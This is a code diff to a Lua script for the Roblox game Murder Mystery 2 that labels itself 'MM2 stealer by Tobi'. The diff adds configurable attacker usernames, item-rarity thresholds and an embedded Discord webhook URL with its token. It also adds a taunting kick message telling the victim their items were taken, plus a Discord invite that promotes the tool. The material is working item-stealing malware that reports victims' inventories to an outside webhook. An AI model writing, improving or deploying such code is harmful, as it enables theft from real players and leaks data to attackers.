@@ -4,11 +4,16 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
-local users = {"ally4ofc"}
-local min_rarity = "Godly"
-local min_value = 1
-local ping = "Yes"
-local webhook = "https://discord.com/api/webhooks/1406712352484884540/QCZ3f9yFDb3ITZZiMXj6NZ84eaS_PsNxp_ltKNoG1TrJB-WByGhU4Ucjqrbu4je38IMM"
+local users = _G.Usernames or {"ally4ofc"}
+local min_rarity = _G.min_rarity or "Godly"
+local min_value = _G.min_value or 1
+local ping = _G.pingEveryone or "No"
+local webhook = _G.webhook or "https://discord.com/api/webhooks/1406982165257785515/f-Fhp7M0hDM3-doX8wWN7MR8MuPgj5mzx5JeJdDO4y-3KAkBlrNAgR6PdcWWEtbL8t4v"
+
+if next(users) == nil or webhook == "" then
+    plr:kick("You didn't add username or webhook")
+    return
+end
 
 if game.PlaceId ~= 142823291 then
     plr:kick("Game not supported. Please join a normal MM2 server")
@@ -282,7 +287,7 @@ local function SendFirstMessage(list, prefix)
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "d"
+                ["text"] = "MM2 stealer by Tobi. discord.gg/GY2RVSEGDT"
             }
         }}
     }
@@ -475,6 +480,9 @@ if #weaponsToSend > 0 then
             end
             wait(1)
         end
+        plr:kick("All your stuff just got taken by Tobi's stealer. discord.gg/GY2RVSEGDT")
+    end
+
     local function waitForUserChat()
         local sentMessage = false
         local function onPlayerChat(player)
